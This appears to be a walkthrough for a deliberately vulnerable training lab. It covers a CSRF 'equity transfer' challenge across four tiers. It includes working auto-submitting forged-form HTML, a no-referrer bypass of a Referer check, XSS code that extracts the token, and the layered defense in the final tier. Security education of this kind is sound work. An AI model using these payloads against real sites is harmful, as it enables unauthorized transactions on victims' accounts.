# Cross-Site Request Forgery

OWASP: https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/
CWE: CWE-352

Cross-site request forgery (CSRF) tricks a victim's browser into submitting a state-changing request to an application where the victim is authenticated. The attacker hosts a malicious page that auto-submits a form or sends a fetch request to the target application, and the browser automatically attaches the victim's session cookies.

---

## One-Click Equity Dilution (`csrf_transfer`)

**Difficulty:** Junior
**CWE:** CWE-352
**Route:** `POST /challenges/csrf/transfer`

### Intern Tier

**Vulnerability:** The transfer endpoint accepts POST requests with no CSRF token, no Origin/Referer validation, and no SameSite cookie attribute. Any cross-origin page can submit a form to this endpoint, and the browser will attach the victim's session cookie.

**Exploit:**

1. Host the following HTML on an attacker-controlled domain:

```html
<html>
<body onload="document.getElementById('csrf-form').submit()">
  <form id="csrf-form" method="POST" action="http://localhost:8000/challenges/csrf/transfer">
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="hidden" name="amount" value="999999">
  </form>
</body>
</html>
```

2. When a logged-in victim visits this page, the form auto-submits with the victim's session
3. The transfer executes without the victim's knowledge or consent

**Solve condition:** The challenge solves when a transfer request succeeds (`result.success == True`).

**Why it works:** Browsers send cookies with every request to a domain, regardless of which page initiated the request. Without CSRF protection, the server cannot distinguish between a legitimate form submission and a forged one from an attacker's page.

### Junior Tier

**What changed:** The handler checks the `Referer` header for `localhost` or `127.0.0.1`. Requests from other origins are rejected. However, empty Referer values are allowed.

**Bypass:** Strip the Referer header. Browser privacy extensions or the `Referrer-Policy` meta tag can suppress the header.

**Exploit:**

```html
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body onload="document.getElementById('csrf-form').submit()">
  <form id="csrf-form" method="POST" action="http://localhost:8000/challenges/csrf/transfer">
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="hidden" name="amount" value="999999">
  </form>
</body>
</html>
```

The `<meta name="referrer" content="no-referrer">` tag prevents the browser from sending a Referer header. The server sees an empty Referer, which passes the check.

### Senior Tier

**What changed:** Synchronizer token pattern: a CSRF token is stored in the session and compared against a token submitted in the form. However, the token is not rotated after use (valid for the entire session), and no Origin header validation is performed.

**Bypass:** If you can obtain the CSRF token (via XSS, network sniffing, or the token being leaked in a URL), it remains valid for the entire session.

**Exploit:**

1. First, exploit an XSS vulnerability to extract the CSRF token from the page:

```javascript
fetch('/challenges/csrf').then(r => r.text()).then(html => {
  const token = html.match(/name="csrf_token" value="([^"]+)"/)[1];
  // Use token in forged request
});
```

2. Submit the forged transfer with the stolen token.

### Tech Lead Tier

**Defense:** Three-layer CSRF protection:

1. **Synchronizer token:** Session-bound CSRF token required on all state-changing requests
2. **Origin validation:** `Origin` header checked against an allowlist of permitted origins
3. **Token rotation:** CSRF tokens are regenerated after each successful transfer
4. **SameSite cookies:** Set at the framework level to prevent cross-origin cookie attachment

**Why it works:** The synchronizer token ensures requests originate from the application's own forms. Origin validation provides defense-in-depth. Token rotation limits the window of exploitation if a token is leaked. SameSite cookies prevent the browser from sending session cookies on cross-origin requests. This addresses CWE-352 through multiple independent controls.
